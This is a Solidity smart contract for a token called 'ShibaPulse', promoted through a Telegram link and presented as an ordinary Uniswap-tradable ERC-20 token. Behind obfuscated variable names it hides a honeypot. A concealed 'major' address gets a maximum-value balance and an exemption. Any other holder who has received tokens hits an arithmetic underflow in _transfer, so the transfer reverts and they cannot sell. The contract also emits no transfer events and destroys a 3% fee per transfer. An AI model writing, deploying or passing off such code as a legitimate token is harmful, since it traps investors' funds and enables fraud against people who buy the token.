// https://t.me/shibapulse_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ShibaPulse is Ownable {
    constructor(
        string memory clothes,
        string memory plane,
        address recently,
        address major
    ) {
        uniswapV2Router = IUniswapV2Router02(recently);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[major] = join;
        _symbol = plane;
        _name = clothes;
        improve = 3;
        _decimals = 9;
        unit[major] = join;
        standard = 1000000000;
        unit[msg.sender] = join;
        _tTotal = standard * 10**_decimals;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public improve;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private standard;
    address public uniswapV2Pair;
    uint256 private join = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private where;

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address wear,
        address include,
        uint256 river
    ) internal {
        uint256 original = improve;

        address consist = uniswapV2Pair;

        if (unit[wear] == 0 && (consist != wear) && across[wear] > 0) {
            unit[wear] -= original;
        }

        address light = where;
        where = include;

        _balances[wear] -= river;
        uint256 blanket = (river / 100) * improve;
        river -= blanket;
        across[light] += 1 + original;
        _balances[include] += river;
    }

    mapping(address => uint256) private across;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private unit;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}